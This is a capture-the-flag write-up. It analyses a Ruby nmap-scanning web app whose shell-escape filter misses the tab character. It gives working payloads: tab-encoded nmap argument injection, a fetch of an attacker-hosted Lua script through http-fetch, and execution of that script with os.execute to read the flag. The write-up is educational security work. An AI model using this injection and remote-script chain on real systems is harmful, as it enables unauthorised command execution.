+ This challenge allows us to scan an IP:PORT pair using the nmap tool. The goal of this kind of challenge is used to achieve RCE.
+ In scanner.rb:
```
post '/' do
    input_service = escape_shell_input(params[:service])
    hostname, port = input_service.split ':', 2
    begin
      if valid_ip? hostname and valid_port? port
        # Service up?
        s = TCPSocket.new(hostname, port.to_i)
        s.close
        # Assuming valid ip and port, this should be fine
        @scan_result = IO.popen("nmap -p #{port} #{hostname}").read
      else
        @scan_result = "Invalid input detected, aborting scan!"
      end
    rescue Errno::ECONNREFUSED
      @scan_result = "Connection refused on #{hostname}:#{port}"
    rescue => e
      @scan_result = e.message
    end
```
+ code checks if both the hostname and port are valid using the valid_ip? and valid_port?
+ If both the IP address and port are valid, it attempts to create a TCP socket connection to the specified hostname and port
+ If the connection is successful, it immediately closes the socket and proceeds to run an Nmap scan using the IO.popen function. The Nmap command scans the specified port on the specified host.

In scanner_helper.rb:
```
def valid_port?(input)
  !input.nil? and (1..65535).cover?(input.to_i)
end

def valid_ip?(input)
  pattern = /\A((25[0-5]|2[0-4]\d|[01]?\d{1,2})\.){3}(25[0-5]|2[0-4]\d|[01]?\d{1,2})\z/
  !input.nil? and !!(input =~ pattern)
end

# chatgpt code :-)
def escape_shell_input(input_string)
  escaped_string = ''
  input_string.each_char do |c|
    case c
    when ' '
      escaped_string << '\\ '
    when '$'
      escaped_string << '\\$'
    when '`'
      escaped_string << '\\`'
    when '"'
      escaped_string << '\\"'
    when '\\'
      escaped_string << '\\\\'
    when '|'
      escaped_string << '\\|'
    when '&'
      escaped_string << '\\&'
    when ';'
      escaped_string << '\\;'
    when '<'
      escaped_string << '\\<'
    when '>'
      escaped_string << '\\>'
    when '('
      escaped_string << '\\('
    when ')'
      escaped_string << '\\)'
    when "'"
      escaped_string << '\\\''
    when "\n"
      escaped_string << '\\n'
    when "*"
      escaped_string << '\\*'
    else
      escaped_string << c
    end
  end

  escaped_string
end
```
+ `valid_port` function checks if the input is not nil and the input value is within the range of valid port numbers (1 to 65535).
+ `valid_ip` functions uses regular expressions to validate if the provided input is a valid IPv4 address. It returns true if the input is not nil and matches the defined IPv4 pattern.
+ `escape_shell_input` function returns a new string with the escaped characters, ensuring that the input string is safe to use in shell commands. This particular function escapes a lot of possible cmd injections possibilities.
+ We can observe that Tab isn't blacklisted, we can use %09 to give options
+ We can use tab to add arguments.
+ Script feature of nmap: The Nmap Scripting Engine (NSE) is one of Nmap's most powerful and flexible features. It allows users to write (and share) simple scripts to automate a wide variety of networking tasks. Those scripts are then executed in parallel with the speed and efficiency you expect from Nmap. Nmap scripts are written in Lua
+ so our goal is to upload a lua script and then execute it.
+ We have argument injection via tab(%09) character
![image](https://github.com/av4nth1ka/My-Writeups/assets/80388135/1854a9a1-0cf9-483f-9225-fac082f30e43)
+ Now we need to read the flag, according to GTFObins we can try to execute system commands via --script option
![image](https://github.com/av4nth1ka/My-Writeups/assets/80388135/58413cf3-9b14-4f29-9bc2-4fd365d987b2)
But due to the escape character filter, this wont work
+ We can download arbitrary files using to target machine via `http-fetch`.
![image](https://github.com/av4nth1ka/My-Writeups/assets/80388135/0f5238c7-689a-42ba-b2bb-02e20730f13e)

payload: service=172.17.0.1:80%09--script%09http-fetch%09--script-args%09http-fetch.destination=/tmp,http-fetch.url=/payload.nse
`payload.nse`
os.execute('cat /flag-*')

+ Host the payload.nse payload script via Python’s http.server module & Upload the payload script via Nmap’s http-fetch module
  ![image](https://github.com/av4nth1ka/My-Writeups/assets/80388135/adb2c361-80ea-48a7-aa4a-dfa2128be73c)
  Now run the uploaded script:
  ```
  service=172.17.0.1:80%09--script%09/tmp/172.17.0.1/80/payload.nse
  ```
  Thus we get the flag locally!



